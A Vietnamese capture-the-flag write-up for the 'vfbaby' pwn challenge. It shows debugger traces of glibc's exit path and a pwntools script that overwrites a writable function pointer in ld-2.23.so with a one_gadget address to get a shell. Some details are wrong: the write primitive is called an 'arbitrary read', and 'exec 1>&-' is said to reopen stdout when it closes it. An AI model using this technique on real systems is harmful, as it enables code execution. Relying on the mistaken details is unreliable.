# write up vfbaby 
- khi mở chương trình lên, chương trình cho phép em có thể có được địa chỉ của libc
```shell
as@vfbaby🍎 ls
flag  howtoror17.txt  ld-2.23.so  libc-2.23.so  libc.so.6  ptr_guard.py  solve.py  vfbaby  vfbaby.i64  vfbaby.md  vfbaby.py  vfbaby_patched  vfbaby_patched-origin  vfbaby_patched-origin.i64  vfbaby_patched.i64
as@vfbaby🍎 ./vfbaby         
here is a gift 0x767a58e553a0, good luck ;)
```
-  Bài tập trung vào lỗi của exit vì bài có arbitrary read, nhìn vào hàm dường như không thấy gì ngoài việc ta có thể ghi dữ liệu vào 1 địa chỉ nào đó thông qua read vì thế em có thể dùng read để ghi 1 cái gì đó vào vùng ghi được của libc

```assembly
  0x7c0c1f3c0000     0x7c0c1f3c4000 r--p     4000 1c0000 /home/as/pwnable/vfbaby/libc-2.23.so
    0x7c0c1f3c4000     0x7c0c1f3c6000 rw-p     2000 1c4000 /home/as/pwnable/vfbaby/libc-2.23.so
    ```
khi debug và đi sâu xuống hàm exit(), em bắt gặp nó call cái địa chỉ này, đây chính là nó đang call hàm __run_exit_handlers
```assembly
 ► 0x5d00caa00780 <exit@plt>     jmp    qword ptr [rip + 0x20085a]    <exit>
    ↓
   0x7c0c1f03a030 <exit>         lea    rsi, [rip + 0x38a5c1]
   0x7c0c1f03a037 <exit+7>       sub    rsp, 8
   0x7c0c1f03a03b <exit+11>      mov    edx, 1
   0x7c0c1f03a040 <exit+16>      call   0x7c0c1f039f10                <0x7c0c1f039f10>
 
   0x7c0c1f03a045                nop    word ptr cs:[rax + rax]
   0x7c0c1f03a04f                nop    
   0x7c0c1f03a050 <on_exit>      push   rbp
   0x7c0c1f03a051 <on_exit+1>    push   rbx
   0x7c0c1f03a052 <on_exit+2>    mov    rbx, rdi
   0x7c0c1f03a055 <on_exit+5>    lea    rdi, [rip + 0x38a59c]
   ```


```C
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

- tiếp tục đi sâu vào hàm đó thì em thấy nó call 1 hàm khác là rdx, và khi nó mov giá trị từ địa chỉ $rax-0x18 thì nó xor với 1 giá trị khác ở vùng fs:0x30 để có được 1 địa chỉ libc có thể thực thi, cả 2 vùng đều có thể ghi được nhưng có 1 vấn đề là các giá trị này random nên em không thể ghi vào đó để khai thác,  hiện tại em chỉ sở hữu libc nên em phải tìm 1 chỗ khác tương tự

 
```assembly
  0x7c0c1f039fde    add    rax, r13
   0x7c0c1f039fe1    mov    rdx, qword ptr [rax + 0x18]
   0x7c0c1f039fe5    mov    rdi, qword ptr [rax + 0x20]
   0x7c0c1f039fe9    ror    rdx, 0x11
   0x7c0c1f039fed    xor    rdx, qword ptr fs:[0x30]
 ► 0x7c0c1f039ff6    call   rdx                           <0x7c0c1f410ab0>
 
   0x7c0c1f039ff8    jmp    0x7c0c1f039f30                <0x7c0c1f039f30>
 
   0x7c0c1f039ffd    nop    dword ptr [rax]
   0x7c0c1f03a000    shl    rax, 5
   0x7c0c1f03a004    mov    rax, qword ptr [r13 + rax + 0x18]
   0x7c0c1f03a009    ror    rax, 0x11

  ```
- khi đi sâu vào hàm mà đc call từ rdx, ta sẽ thấy có 1 vị trí call khác là  ``` call   qword ptr [rip + 0x216414]   ```
```assembly
  0x75aba1e10ae0    lea    rax, [rax + rax*8]
   0x75aba1e10ae4    lea    rcx, [rip + 0x215555]         <_rtld_global>
   0x75aba1e10aeb    shl    rax, 4
   0x75aba1e10aef    lea    r12, [rcx + rax - 0x88]
   0x75aba1e10af7    jmp    0x75aba1e10b27                <0x75aba1e10b27>
    ↓
 ► 0x75aba1e10b27    lea    rdi, [rip + 0x215e1a]         <_rtld_global+2312>
   0x75aba1e10b2e    call   qword ptr [rip + 0x216414]    <0x75aba1e00c90>
 
   0x75aba1e10b34    mov    ecx, dword ptr [r12]
   0x75aba1e10b38    test   ecx, ecx
   0x75aba1e10b3a    je     0x75aba1e10b00                <0x75aba1e10b00>
 
   0x75aba1e10b3c    mov    rax, qword ptr [r12 - 8]
```
- lệnh call đó có nghĩa là nó sẽ call giá trị chứa trong địa chỉ $rip+0x216414 với $rip được tính theo câu lệnh trước đó ở đây $rip =    0x75aba1e10b34
- khi check thì địa chỉ tại đây có quyền đọc ghi nên em có thể dùng để khai thác
```assembly
pwndbg> vm 0x75aba1e10b34+0x216414
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x75aba2025000     0x75aba2026000 r--p     1000  25000 /home/as/pwnable/vfbaby/ld-2.23.so
►   0x75aba2026000     0x75aba2027000 rw-p     1000  26000 /home/as/pwnable/vfbaby/ld-2.23.so +0xf48
    0x75aba2027000     0x75aba2028000 rw-p     1000      0 [anon_75aba2027]
```
- sau khi xong thì em có thể dùng onegadget và ghi 3 byte đầu vào thông qua arbitrary read

```python
p.recvuntil(b'a gift ')
input()
addr = p.recvuntil(b',', drop=True)
leak_addr = int(addr, 16)
base_libc = leak_addr - 0xcc230
one_gadget = base_libc + 0xf02a4
write_addr = base_libc+0x626f48

part1_onegadget = one_gadget & 0xff
part2_onegadget = (one_gadget >> 8) & 0xff
part3_onegadget = (one_gadget >> 16) & 0xff


xor2 = leak_addr+ 0x2f9a28 
xor1 = leak_addr 
push_rbp_ld = leak_addr + 3426432

p.sendafter(b'good luck ;)',p64(write_addr))
input()
p.send(p64(part1_onegadget))
input()
p.send(p64(write_addr + 1))
input()
p.send(p64(part2_onegadget))
input()
p.send(p64(write_addr + 2))
input()
p.send(p64(part3_onegadget))
input()
```

- sau khi chạy code thì shell vẫn được thực thi nhưng stdout bị đóng nên cần phải nhập ```bash exec 1>&- ``` để mở lại stdout
- test thử khả năng run ở local
```bash
as@vfbaby🍎 ls
2               libc-2.23.so  vfbaby          vfbaby_patched-origin      vfbaby_patched-origin.id2
flag            libc.so.6     vfbaby.i64      vfbaby_patched-origin.i64  vfbaby_patched-origin.nam
howtoror17.txt  ptr_guard.py  vfbaby.py       vfbaby_patched-origin.id0  vfbaby_patched-origin.til
ld-2.23.so      solve.py      vfbaby_patched  vfbaby_patched-origin.id1  vfbaby_patched.i64
```
```bash
  $ cat flag > lmao
[DEBUG] Sent 0x10 bytes:
    b'cat flag > lmao\n'
```
```bash
as@vfbaby🍎 ls
2               libc.so.6     vfbaby.i64                 vfbaby_patched-origin.id0  vfbaby_patched.i64
flag            lmao          vfbaby.py                  vfbaby_patched-origin.id1
howtoror17.txt  ptr_guard.py  vfbaby_patched             vfbaby_patched-origin.id2
ld-2.23.so      solve.py      vfbaby_patched-origin      vfbaby_patched-origin.nam
libc-2.23.so    vfbaby        vfbaby_patched-origin.i64  vfbaby_patched-origin.til
```
